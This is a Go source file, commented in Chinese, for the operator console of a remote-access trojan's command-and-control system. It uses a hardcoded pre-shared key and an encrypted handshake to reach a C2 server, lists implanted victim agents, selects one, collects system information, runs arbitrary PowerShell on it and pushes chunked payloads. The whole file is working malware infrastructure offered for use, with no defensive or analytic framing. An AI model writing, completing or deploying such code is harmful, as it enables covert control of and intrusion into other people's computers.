// ratctl — C2 控制端交互式 CLI（meterpreter 风格）
//
// 用法：ratctl [-s host:port]
// 进入交互式 shell，命令集见 help：
//
//	sessions                 列出在线 Agent
//	use <agent_id>           切换到目标 Agent（后续指令发往它）
//	back                     退出当前 Agent
//	sysinfo                  收集当前 Agent 系统信息
//	exec <powershell 命令>    在当前 Agent 执行 PowerShell
//	help                     帮助
//	exit / quit              退出
package main

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"ratc2/internal/protocol"
)

const (
	defaultAddr = "127.0.0.1:4444"
	pskHex      = "0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20"
	helloVersion = uint32(1<<16 | 1)
	// 结果等待超时：beacon 轮询下要等 sleeptime(60s) + 执行(120s) + 余量
	waitTimeout = 240 * time.Second
	// payload 分块大小（协议 §10）
	payloadChunkSize = 256 * 1024
)

// SessionInfo 会话表条目（协议 §5.3）。
type SessionInfo struct {
	ID       string
	IP       string
	Port     uint16
	OS       string
	Plugins  uint32
	LastSeen time.Time
	Online   bool
}

// shellState 交互式 shell 的共享状态。
type shellState struct {
	conn net.Conn
	key  []byte
	addr string // C2 地址（拉起 viewer 时透传）

	seq  atomic.Uint32 // 指令序号（严格递增，满足服务器防重放）
	cur  string        // 当前 Agent ID（hex，空 = 未选择）
	curMu sync.Mutex

	sessions []SessionInfo // sessions 命令的最近结果缓存

	lastSeqMu sync.Mutex
	lastSeq   uint32 // 读线程防重放

	pendings sync.Map // seq -> chan result
}

// result 读线程分发给等待者的包。
type result struct {
	cmd    uint16
	status uint8
	body   []byte
}

func main() {
	addr := flag.String("s", defaultAddr, "C2 server address host:port")
	viewerPath := flag.String("viewer", "", "viewer.exe 路径（默认自动查找）")
	flag.Parse()
	viewerOverride = *viewerPath

	psk, err := hex.DecodeString(pskHex)
	if err != nil {
		fatal("bad psk: %v", err)
	}
	conn, err := net.Dial("tcp", *addr)
	if err != nil {
		fatal("connect %s: %v", *addr, err)
	}
	defer conn.Close()

	key, err := handshake(conn, psk)
	if err != nil {
		fatal("handshake: %v", err)
	}
	fmt.Fprintf(os.Stderr, "connected to %s (session key derived)\n", *addr)

	st := &shellState{conn: conn, key: key, addr: *addr}
	go st.readLoop() // 后台读线程：收 CMD_RESULT / 管理响应
	st.repl()
}

// readLoop 后台读线程：解密 → 防重放 → 按 seq 分发给等待者。
func (st *shellState) readLoop() {
	for {
		h, raw, err := protocol.ReadPacket(st.conn)
		if err != nil {
			fmt.Fprintf(os.Stderr, "\n[!] connection lost: %v\n", err)
			os.Exit(1)
		}
		body, err := protocol.DecryptPayload(st.key, raw)
		if err != nil {
			continue
		}
		st.lastSeqMu.Lock()
		if h.Seq <= st.lastSeq {
			st.lastSeqMu.Unlock()
			continue // 重放/乱序
		}
		st.lastSeq = h.Seq
		st.lastSeqMu.Unlock()

		if p, ok := st.pendings.Load(h.Seq); ok {
			select {
			case p.(chan result) <- result{cmd: h.Cmd, status: h.Status, body: body}:
			default: // 缓冲满：丢弃（超时方会自己退出）
			}
		}
	}
}

// sendAndWait 发送一条指令并同步等待其响应（seq 全局递增）。
func (st *shellState) sendAndWait(cmd uint16, plugin uint8, payload []byte,
	wantCmd uint16, timeout time.Duration) (uint8, []byte, error) {
	seq := st.seq.Add(1)
	enc, err := protocol.EncryptPayload(st.key, payload)
	if err != nil {
		return 0, nil, err
	}
	ch := make(chan result, 1)
	st.pendings.Store(seq, ch)
	defer st.pendings.Delete(seq)

	if err := protocol.WritePacket(st.conn, &protocol.Header{
		Flags: protocol.FlagEncrypted, Seq: seq, Cmd: cmd, Plugin: plugin,
	}, enc); err != nil {
		return 0, nil, err
	}

	select {
	case r := <-ch:
		// 服务器同步错误响应：cmd = 原请求指令码，status 非 0（如 NoSession/参数错）
		if r.cmd == cmd && r.status != protocol.StatusOK {
			return r.status, nil, fmt.Errorf("server status=%d", r.status)
		}
		if r.cmd != wantCmd {
			return 0, nil, fmt.Errorf("unexpected response cmd=0x%04x", r.cmd)
		}
		return r.status, r.body, nil
	case <-time.After(timeout):
		return 0, nil, errors.New("timeout waiting response")
	}
}

// currentAgentIDHex 返回当前选中的 Agent ID（hex）。
func (st *shellState) currentAgentIDHex() (string, error) {
	st.curMu.Lock()
	cur := st.cur
	st.curMu.Unlock()
	if cur == "" {
		return "", errors.New("no agent selected (use 'sessions' then 'use <id>')")
	}
	return cur, nil
}

// buildBusinessTo 构造业务指令 payload：agent_id(16B) + args（C2 据此路由，转发时剥离前缀）。
func (st *shellState) buildBusinessTo(agentHex string, args []byte) ([]byte, error) {
	agentID, err := hex.DecodeString(agentHex)
	if err != nil || len(agentID) != 16 {
		return nil, fmt.Errorf("bad agent id %q", agentHex)
	}
	payload := make([]byte, 0, 16+len(args))
	payload = append(payload, agentID...)
	payload = append(payload, args...)
	return payload, nil
}

// buildBusiness 使用当前选中的 Agent 构造业务 payload。
func (st *shellState) buildBusiness(args []byte) ([]byte, error) {
	cur, err := st.currentAgentIDHex()
	if err != nil {
		return nil, err
	}
	return st.buildBusinessTo(cur, args)
}

// businessRawTo 向指定 Agent 发送业务指令，返回 status 与结果原始字节（二进制安全）。
func (st *shellState) businessRawTo(agentHex string, cmd uint16, plugin uint8, args []byte,
	timeout time.Duration) (uint8, []byte, error) {
	payload, err := st.buildBusinessTo(agentHex, args)
	if err != nil {
		return 0, nil, err
	}
	_, body, err := st.sendAndWait(cmd, plugin, payload, protocol.CmdResult, timeout)
	if err != nil {
		return 0, nil, err
	}
	if len(body) < 5 {
		return 0, nil, errors.New("short result payload")
	}
	return body[4], body[5:], nil
}

// businessRaw 对当前选中的 Agent 发送业务指令。
func (st *shellState) businessRaw(cmd uint16, plugin uint8, args []byte,
	timeout time.Duration) (uint8, []byte, error) {
	cur, err := st.currentAgentIDHex()
	if err != nil {
		return 0, nil, err
	}
	return st.businessRawTo(cur, cmd, plugin, args, timeout)
}

// execBusiness 业务指令的文本封装（payload = agent_id + args），返回 status 与结果文本。
func (st *shellState) execBusiness(cmd uint16, plugin uint8, args []byte) (uint8, string, error) {
	status, body, err := st.businessRaw(cmd, plugin, args, waitTimeout)
	if err != nil {
		return 0, "", err
	}
	return status, string(body), nil
}

// businessNoWait 只发送不等结果（payload 分块流水线：末块才等待）。
func (st *shellState) businessNoWait(cmd uint16, plugin uint8, args []byte) error {
	payload, err := st.buildBusiness(args)
	if err != nil {
		return err
	}
	enc, err := protocol.EncryptPayload(st.key, payload)
	if err != nil {
		return err
	}
	seq := st.seq.Add(1)
	return protocol.WritePacket(st.conn, &protocol.Header{
		Flags: protocol.FlagEncrypted, Seq: seq, Cmd: cmd, Plugin: plugin,
	}, enc)
}

// handshake 完成 HELLO/HELLO_ACK，返回派生会话密钥。
func handshake(conn net.Conn, psk []byte) ([]byte, error) {
	clientNonce := make([]byte, protocol.ClientNonceLen)
	if _, err := rand.Read(clientNonce); err != nil {
		return nil, err
	}
	agentID := make([]byte, 16) // CONTROL 填 0

	hello := make([]byte, 0, 4+1+16+16)
	hello = binary.LittleEndian.AppendUint32(hello, helloVersion)
	hello = append(hello, protocol.RoleControl)
	hello = append(hello, agentID...)
	hello = append(hello, clientNonce...)
	if err := protocol.WritePacket(conn, &protocol.Header{
		Cmd: protocol.CmdHello, Plugin: protocol.PluginCore,
	}, hello); err != nil {
		return nil, err
	}

	h, raw, err := protocol.ReadPacket(conn)
	if err != nil {
		return nil, err
	}
	if h.Cmd != protocol.CmdHelloAck {
		return nil, fmt.Errorf("expected HELLO_ACK, got cmd=0x%04x", h.Cmd)
	}
	if len(raw) < 1+protocol.ServerNonceLen {
		return nil, fmt.Errorf("short HELLO_ACK")
	}
	if raw[0] != 0 {
		return nil, fmt.Errorf("handshake rejected: accept=%d", raw[0])
	}
	serverNonce := raw[1 : 1+protocol.ServerNonceLen]
	return protocol.DeriveSessionKey(psk, clientNonce, serverNonce), nil
}

// decodeSessions 按协议 §5.3 解码会话数组。
func decodeSessions(b []byte) ([]SessionInfo, error) {
	r := bytes.NewReader(b)
	var count uint32
	if err := binary.Read(r, binary.LittleEndian, &count); err != nil {
		return nil, err
	}
	out := make([]SessionInfo, 0, count)
	for i := uint32(0); i < count; i++ {
		var s SessionInfo
		id := make([]byte, 16)
		if _, err := io.ReadFull(r, id); err != nil {
			return nil, err
		}
		s.ID = hex.EncodeToString(id)
		var ip4 [4]byte
		if _, err := io.ReadFull(r, ip4[:]); err != nil {
			return nil, err
		}
		s.IP = net.IP(ip4[:]).String()
		if err := binary.Read(r, binary.LittleEndian, &s.Port); err != nil {
			return nil, err
		}
		var osLen uint16
		if err := binary.Read(r, binary.LittleEndian, &osLen); err != nil {
			return nil, err
		}
		osb := make([]byte, osLen)
		if _, err := io.ReadFull(r, osb); err != nil {
			return nil, err
		}
		s.OS = string(osb)
		if err := binary.Read(r, binary.LittleEndian, &s.Plugins); err != nil {
			return nil, err
		}
		var ms uint64
		if err := binary.Read(r, binary.LittleEndian, &ms); err != nil {
			return nil, err
		}
		s.LastSeen = time.UnixMilli(int64(ms))
		var online uint8
		if err := binary.Read(r, binary.LittleEndian, &online); err != nil {
			return nil, err
		}
		s.Online = online != 0
		out = append(out, s)
	}
	return out, nil
}

func trunc(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

func shortID(id string) string {
	if len(id) > 8 {
		return id[:8]
	}
	return id
}

func fatal(format string, args ...any) {
	fmt.Fprintf(os.Stderr, "ratctl: "+format+"\n", args...)
	os.Exit(1)
}
